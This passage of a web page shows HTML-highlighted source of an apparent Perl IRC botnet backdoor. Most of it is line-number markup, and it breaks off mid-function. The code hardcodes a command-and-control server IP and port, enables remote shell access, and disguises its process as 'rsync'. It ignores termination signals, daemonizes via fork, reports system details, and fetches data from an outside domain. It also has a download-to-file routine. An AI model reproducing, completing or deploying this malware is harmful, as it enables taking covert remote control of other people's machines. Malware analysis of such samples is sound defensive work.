class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br><span class=\"line\">666</span><br><span class=\"line\">667</span><br><span class=\"line\">668</span><br><span class=\"line\">669</span><br><span class=\"line\">670</span><br><span class=\"line\">671</span><br><span class=\"line\">672</span><br><span class=\"line\">673</span><br><span class=\"line\">674</span><br><span class=\"line\">675</span><br><span class=\"line\">676</span><br><span class=\"line\">677</span><br><span class=\"line\">678</span><br><span class=\"line\">679</span><br><span class=\"line\">680</span><br><span class=\"line\">681</span><br><span class=\"line\">682</span><br><span class=\"line\">683</span><br><span class=\"line\">684</span><br><span class=\"line\">685</span><br><span class=\"line\">686</span><br><span class=\"line\">687</span><br><span class=\"line\">688</span><br><span class=\"line\">689</span><br><span class=\"line\">690</span><br><span class=\"line\">691</span><br><span class=\"line\">692</span><br><span class=\"line\">693</span><br><span class=\"line\">694</span><br><span class=\"line\">695</span><br><span class=\"line\">696</span><br><span class=\"line\">697</span><br><span class=\"line\">698</span><br><span class=\"line\">699</span><br><span class=\"line\">700</span><br><span class=\"line\">701</span><br><span class=\"line\">702</span><br><span class=\"line\">703</span><br><span class=\"line\">704</span><br><span class=\"line\">705</span><br><span class=\"line\">706</span><br><span class=\"line\">707</span><br><span class=\"line\">708</span><br><span class=\"line\">709</span><br><span class=\"line\">710</span><br><span class=\"line\">711</span><br><span class=\"line\">712</span><br><span class=\"line\">713</span><br><span class=\"line\">714</span><br><span class=\"line\">715</span><br><span class=\"line\">716</span><br><span class=\"line\">717</span><br><span class=\"line\">718</span><br><span class=\"line\">719</span><br><span class=\"line\">720</span><br><span class=\"line\">721</span><br><span class=\"line\">722</span><br><span class=\"line\">723</span><br><span class=\"line\">724</span><br><span class=\"line\">725</span><br><span class=\"line\">726</span><br><span class=\"line\">727</span><br><span class=\"line\">728</span><br><span class=\"line\">729</span><br><span class=\"line\">730</span><br><span class=\"line\">731</span><br><span class=\"line\">732</span><br><span class=\"line\">733</span><br><span class=\"line\">734</span><br><span class=\"line\">735</span><br><span class=\"line\">736</span><br><span class=\"line\">737</span><br><span class=\"line\">738</span><br><span class=\"line\">739</span><br><span class=\"line\">740</span><br><span class=\"line\">741</span><br><span class=\"line\">742</span><br><span class=\"line\">743</span><br><span class=\"line\">744</span><br><span class=\"line\">745</span><br><span class=\"line\">746</span><br><span class=\"line\">747</span><br><span class=\"line\">748</span><br><span class=\"line\">749</span><br><span class=\"line\">750</span><br><span class=\"line\">751</span><br><span class=\"line\">752</span><br><span class=\"line\">753</span><br><span class=\"line\">754</span><br><span class=\"line\">755</span><br><span class=\"line\">756</span><br><span class=\"line\">757</span><br><span class=\"line\">758</span><br><span class=\"line\">759</span><br><span class=\"line\">760</span><br><span class=\"line\">761</span><br><span class=\"line\">762</span><br><span class=\"line\">763</span><br><span class=\"line\">764</span><br><span class=\"line\">765</span><br><span class=\"line\">766</span><br><span class=\"line\">767</span><br><span class=\"line\">768</span><br><span class=\"line\">769</span><br><span class=\"line\">770</span><br><span class=\"line\">771</span><br><span class=\"line\">772</span><br><span class=\"line\">773</span><br><span class=\"line\">774</span><br><span class=\"line\">775</span><br><span class=\"line\">776</span><br><span class=\"line\">777</span><br><span class=\"line\">778</span><br><span class=\"line\">779</span><br><span class=\"line\">780</span><br><span class=\"line\">781</span><br><span class=\"line\">782</span><br><span class=\"line\">783</span><br><span class=\"line\">784</span><br><span class=\"line\">785</span><br><span class=\"line\">786</span><br><span class=\"line\">787</span><br><span class=\"line\">788</span><br><span class=\"line\">789</span><br><span class=\"line\">790</span><br><span class=\"line\">791</span><br><span class=\"line\">792</span><br><span class=\"line\">793</span><br><span class=\"line\">794</span><br><span class=\"line\">795</span><br><span class=\"line\">796</span><br><span class=\"line\">797</span><br><span class=\"line\">798</span><br><span class=\"line\">799</span><br><span class=\"line\">800</span><br><span class=\"line\">801</span><br><span class=\"line\">802</span><br><span class=\"line\">803</span><br><span class=\"line\">804</span><br><span class=\"line\">805</span><br><span class=\"line\">806</span><br><span class=\"line\">807</span><br><span class=\"line\">808</span><br><span class=\"line\">809</span><br><span class=\"line\">810</span><br><span class=\"line\">811</span><br><span class=\"line\">812</span><br><span class=\"line\">813</span><br><span class=\"line\">814</span><br><span class=\"line\">815</span><br><span class=\"line\">816</span><br><span class=\"line\">817</span><br><span class=\"line\">818</span><br><span class=\"line\">819</span><br><span class=\"line\">820</span><br><span class=\"line\">821</span><br><span class=\"line\">822</span><br><span class=\"line\">823</span><br><span class=\"line\">824</span><br><span class=\"line\">825</span><br><span class=\"line\">826</span><br><span class=\"line\">827</span><br><span class=\"line\">828</span><br><span class=\"line\">829</span><br><span class=\"line\">830</span><br><span class=\"line\">831</span><br><span class=\"line\">832</span><br><span class=\"line\">833</span><br><span class=\"line\">834</span><br><span class=\"line\">835</span><br><span class=\"line\">836</span><br><span class=\"line\">837</span><br><span class=\"line\">838</span><br><span class=\"line\">839</span><br><span class=\"line\">840</span><br><span class=\"line\">841</span><br><span class=\"line\">842</span><br><span class=\"line\">843</span><br><span class=\"line\">844</span><br><span class=\"line\">845</span><br><span class=\"line\">846</span><br><span class=\"line\">847</span><br><span class=\"line\">848</span><br><span class=\"line\">849</span><br><span class=\"line\">850</span><br><span class=\"line\">851</span><br><span class=\"line\">852</span><br><span class=\"line\">853</span><br><span class=\"line\">854</span><br><span class=\"line\">855</span><br><span class=\"line\">856</span><br><span class=\"line\">857</span><br><span class=\"line\">858</span><br><span class=\"line\">859</span><br><span class=\"line\">860</span><br><span class=\"line\">861</span><br><span class=\"line\">862</span><br><span class=\"line\">863</span><br><span class=\"line\">864</span><br><span class=\"line\">865</span><br><span class=\"line\">866</span><br><span class=\"line\">867</span><br><span class=\"line\">868</span><br><span class=\"line\">869</span><br><span class=\"line\">870</span><br><span class=\"line\">871</span><br><span class=\"line\">872</span><br><span class=\"line\">873</span><br><span class=\"line\">874</span><br><span class=\"line\">875</span><br><span class=\"line\">876</span><br><span class=\"line\">877</span><br><span class=\"line\">878</span><br><span class=\"line\">879</span><br><span class=\"line\">880</span><br><span class=\"line\">881</span><br><span class=\"line\">882</span><br><span class=\"line\">883</span><br><span class=\"line\">884</span><br><span class=\"line\">885</span><br><span class=\"line\">886</span><br><span class=\"line\">887</span><br><span class=\"line\">888</span><br><span class=\"line\">889</span><br><span class=\"line\">890</span><br><span class=\"line\">891</span><br><span class=\"line\">892</span><br><span class=\"line\">893</span><br><span class=\"line\">894</span><br><span class=\"line\">895</span><br><span class=\"line\">896</span><br><span class=\"line\">897</span><br><span class=\"line\">898</span><br><span class=\"line\">899</span><br><span class=\"line\">900</span><br><span class=\"line\">901</span><br><span class=\"line\">902</span><br><span class=\"line\">903</span><br><span class=\"line\">904</span><br><span class=\"line\">905</span><br><span class=\"line\">906</span><br><span class=\"line\">907</span><br><span class=\"line\">908</span><br><span class=\"line\">909</span><br><span class=\"line\">910</span><br><span class=\"line\">911</span><br><span class=\"line\">912</span><br><span class=\"line\">913</span><br><span class=\"line\">914</span><br><span class=\"line\">915</span><br><span class=\"line\">916</span><br><span class=\"line\">917</span><br><span class=\"line\">918</span><br><span class=\"line\">919</span><br><span class=\"line\">920</span><br><span class=\"line\">921</span><br><span class=\"line\">922</span><br><span class=\"line\">923</span><br><span class=\"line\">924</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> $processo = <span class=\"string\">&#x27;rsync&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$servidor=<span class=\"string\">&#x27;5.255.86.129&#x27;</span> <span class=\"keyword\">unless</span> $servidor;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $porta=<span class=\"string\">&#x27;443&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> @canais=(<span class=\"string\">&quot;#007&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">my</span> @adms=(<span class=\"string\">&quot;A&quot;</span>,<span class=\"string\">&quot;X&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">my</span> @auth=(<span class=\"string\">&quot;localhost&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> $linas_max=<span class=\"number\">6</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $sleep=<span class=\"number\">3</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> $nick = getnick();</span><br><span class=\"line\"><span class=\"keyword\">my</span> $ircname = getnick();</span><br><span class=\"line\"><span class=\"keyword\">my</span> $realname = (<span class=\"string\">`uname -a`</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> $acessoshell = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $prefixo = <span class=\"string\">&quot;! &quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $estatisticas = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $pacotes = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> $VERSAO = <span class=\"string\">&#x27;0.2a&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$SIG&#123;<span class=\"string\">&#x27;INT&#x27;</span>&#125; = <span class=\"string\">&#x27;IGNORE&#x27;</span>;</span><br><span class=\"line\">$SIG&#123;<span class=\"string\">&#x27;HUP&#x27;</span>&#125; = <span class=\"string\">&#x27;IGNORE&#x27;</span>;</span><br><span class=\"line\">$SIG&#123;<span class=\"string\">&#x27;TERM&#x27;</span>&#125; = <span class=\"string\">&#x27;IGNORE&#x27;</span>;</span><br><span class=\"line\">$SIG&#123;<span class=\"string\">&#x27;CHLD&#x27;</span>&#125; = <span class=\"string\">&#x27;IGNORE&#x27;</span>;</span><br><span class=\"line\">$SIG&#123;<span class=\"string\">&#x27;PS&#x27;</span>&#125; = <span class=\"string\">&#x27;IGNORE&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> IO::Socket;</span><br><span class=\"line\"><span class=\"keyword\">use</span> Socket;</span><br><span class=\"line\"><span class=\"keyword\">use</span> IO::Select;</span><br><span class=\"line\"><span class=\"keyword\">chdir</span>(<span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">$servidor=<span class=\"string\">&quot;$ARGV[0]&quot;</span> <span class=\"keyword\">if</span> $ARGV[<span class=\"number\">0</span>];</span><br><span class=\"line\">$0=<span class=\"string\">&quot;$processo&quot;</span>.<span class=\"string\">&quot;\\0&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $pid=<span class=\"keyword\">fork</span>;</span><br><span class=\"line\"><span class=\"keyword\">exit</span> <span class=\"keyword\">if</span> $pid;</span><br><span class=\"line\"><span class=\"keyword\">die</span> <span class=\"string\">&quot;Problema com o fork: $!&quot;</span> <span class=\"keyword\">unless</span> <span class=\"keyword\">defined</span>($pid);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">my</span> %irc_servers;</span><br><span class=\"line\"><span class=\"keyword\">my</span> %DCC;</span><br><span class=\"line\"><span class=\"keyword\">my</span> $dcc_sel = new IO::Select-&gt;new();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">getnick</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">&quot;x&quot;</span>.int(<span class=\"keyword\">rand</span>(<span class=\"number\">9000</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">getident</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $retornoident = &amp;_get(<span class=\"string\">&quot;http://www.minpop.com/sk12pack/idents.php&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $identchance = <span class=\"keyword\">int</span>(<span class=\"keyword\">rand</span>(<span class=\"number\">1000</span>));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ($identchance &gt; <span class=\"number\">30</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">return</span> $nick;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">     <span class=\"keyword\">return</span> $retornoident;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> $retornoident;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">getname</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $retornoname = &amp;_get(<span class=\"string\">&quot;http://www.minpop.com/sk12pack/names.php&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> $retornoname;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">getident2</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">my</span> $length=<span class=\"keyword\">shift</span>;</span><br><span class=\"line\">        $length = <span class=\"number\">3</span> <span class=\"keyword\">if</span> ($length &lt; <span class=\"number\">3</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">my</span> @chars=(<span class=\"string\">&#x27;a&#x27;</span>..<span class=\"string\">&#x27;z&#x27;</span>,<span class=\"string\">&#x27;A&#x27;</span>..<span class=\"string\">&#x27;Z&#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>..<span class=\"string\">&#x27;9&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"number\">1</span>..$length)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                $randomstring.=$chars[<span class=\"keyword\">rand</span> @chars];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $randomstring;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">getstore</span> ($$)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $url = <span class=\"keyword\">shift</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $file = <span class=\"keyword\">shift</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  $http_stream_out = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">open</span>(GET_OUTFILE, <span class=\"string\">&quot;&gt; $file&quot;</span>);</span><br><span class=\"line\">  %http_loop_check = ();</span><br><span class=\"line\">  _get($url);</span><br><span class=\"line\">  <span class=\"keyword\">close</span> GET_OUTFILE;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> $main::http_get_result;</span><br><span class=\"line\">&#125;</span><br><span 